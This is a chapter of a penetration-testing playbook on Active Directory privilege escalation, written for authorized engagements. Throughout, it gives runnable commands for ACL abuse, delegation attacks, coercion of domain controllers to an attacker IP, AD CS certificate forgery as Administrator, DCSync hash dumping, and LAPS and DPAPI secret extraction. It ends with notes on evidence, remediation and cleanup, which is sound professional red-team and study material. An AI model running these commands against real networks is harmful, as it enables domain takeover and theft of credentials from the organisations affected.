# 09 — Active Directory Attacks & Domain Dominance

**Goal:** exploit AD misconfigurations discovered in `05` to reach Domain/Enterprise Admin or the
engagement objective. Validate each edge in BloodHound before executing.

## ACL abuse (from BloodHound "owned → target" edges)
```powershell
# ForceChangePassword over a user
Set-DomainUserPassword -Identity <victim> -AccountPassword (ConvertTo-SecureString 'New<PASS>!' -AsPlainText -Force)
# GenericWrite/GenericAll → set an SPN and targeted-kerberoast, or add to a group
Set-DomainObject -Identity <victim> -Set @{serviceprincipalname='fake/svc'}
Add-DomainGroupMember -Identity 'Target Group' -Members <you>
# WriteDACL → grant yourself DCSync rights, then DCSync (below)
Add-DomainObjectAcl -TargetIdentity 'DC=<...>' -PrincipalIdentity <you> -Rights DCSync
```

## Delegation
```bash
# Unconstrained: own such a host, coerce a DC to auth to it, capture its TGT -> DCSync
#   (coerce with PetitPotam/Coercer below; harvest with Rubeus monitor / on-host)
# Constrained (msDS-AllowedToDelegateTo): request a service ticket AS a privileged user
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate Administrator <DOMAIN>/<svc>:'<PASS>'
# Resource-Based Constrained Delegation (RBCD): if you can write msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-addcomputer <DOMAIN>/<USER>:'<PASS>' -computer-name 'EVIL$' -computer-pass 'P@ss'
impacket-rbcd -delegate-from 'EVIL$' -delegate-to '<TARGET>$' -action write <DOMAIN>/<USER>:'<PASS>'
impacket-getST -spn cifs/<TARGET_FQDN> -impersonate Administrator <DOMAIN>/'EVIL$':'P@ss'
```

## Coercion (force a machine — often a DC — to authenticate to you)
```bash
impacket-petitpotam <ATTACKER_IP> <DC_IP>           # MS-EFSRPC
coercer coerce -u '<USER>' -p '<PASS>' -t <DC_IP> -l <ATTACKER_IP>
# Pair with ntlmrelayx (03) → relay to LDAPS (RBCD/shadow) or to AD CS (ESC8).
```

## AD CS (Certipy) — enumerate then exploit ESC1–ESC8/ESC11+
```bash
certipy find -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -vulnerable -enabled -stdout
# ESC1 (SAN in enrollee-supplies-subject template): request a cert AS admin
certipy req -u '<USER>@<DOMAIN>' -p '<PASS>' -dc-ip <DC_IP> -ca '<CA_NAME>' \
  -template '<VULN_TEMPLATE>' -upn 'Administrator@<DOMAIN>'
# Authenticate with the cert to get a TGT + NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
# ESC8: relay to web enrollment (see 03). Certipy shadow/forge for other ESCs:
certipy shadow auto -u '<USER>@<DOMAIN>' -p '<PASS>' -account '<TARGET>' -dc-ip <DC_IP>
```

## Credential material at the top
```bash
# DCSync any account's hash (needs replication rights — often the objective proof)
impacket-secretsdump -just-dc-user Administrator <DOMAIN>/<USER>:'<PASS>'@<DC_IP>
# LAPS (local admin passwords in AD) if you can read them
nxc ldap <DC_IP> -u '<USER>' -p '<PASS>' -M laps
# DPAPI (masterkeys → browser/cred-manager secrets)
nxc smb <TARGET_IP> -u '<USER>' -p '<PASS>' --dpapi
```

## Persistence tickets (demonstration only, then clean up)
- **Silver ticket**: forge a service ticket with a service account hash (scoped to one service).
- **Golden ticket**: forge TGTs with the `krbtgt` hash (full domain) — powerful; use to *prove* impact,
  document, and note remediation (rotate `krbtgt` twice). Don't leave forged tickets behind.

## Evidence to capture
- The vulnerable object/template (certipy output, BloodHound edge) — the *cause*.
- Proof of impact: DCSync of a privileged hash, or auth as DA (screenshot `whoami` as the DA context).
- Remediation per finding (fix template ACL, disable unconstrained delegation, enforce signing, etc.).

## Pitfalls
- Golden/silver tickets and added computer objects are changes to the environment — log them and remove them.
- Certipy template/CA names are case- and environment-specific — pull them from `certipy find` output.
- Coercion against a DC is high-impact/noisy; coordinate and time-box it.
